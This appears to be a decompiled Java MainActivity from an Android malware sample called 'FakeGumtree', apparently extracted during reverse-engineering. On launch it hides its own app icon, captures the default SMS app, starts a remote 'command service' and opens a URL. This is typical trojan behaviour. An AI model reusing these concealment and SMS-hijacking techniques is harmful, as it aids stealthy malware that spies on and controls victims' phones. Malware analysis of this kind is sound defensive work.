package com.gumsis;

import android.content.ComponentName;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.provider.Telephony.Sms;
import com.gumsis.base.BaseActivity;
import com.gumsis.checktls.IntTls;

public class MainActivity
  extends BaseActivity
{
  private void hideApp()
  {
    Object localObject = getPackageName();
    localObject = new ComponentName((String)localObject, (String)localObject + ".MainActivity");
    getApplicationContext().getPackageManager().setComponentEnabledSetting((ComponentName)localObject, 2, 1);
  }
  
  private void setDefaultSmsCl()
  {
    if (Build.VERSION.SDK_INT < 19) {
      return;
    }
    Realtalk.setDefSmsClPackage(this, Telephony.Sms.getDefaultSmsPackage(this));
  }
  
  protected void onCreate(Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    setContentView(2131230720);
    setDefaultSmsCl();
    IntTls.startCommandService(this);
    IntTls.startWb(this, Realtalk.getStartWebUrl());
    finish();
  }
}


/* Location:              /home/cmd/Programmierung/Android/reverse-engineering/fakegumtree/FakeGumtree-dex2jar.jar!/com/gumsis/MainActivity.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */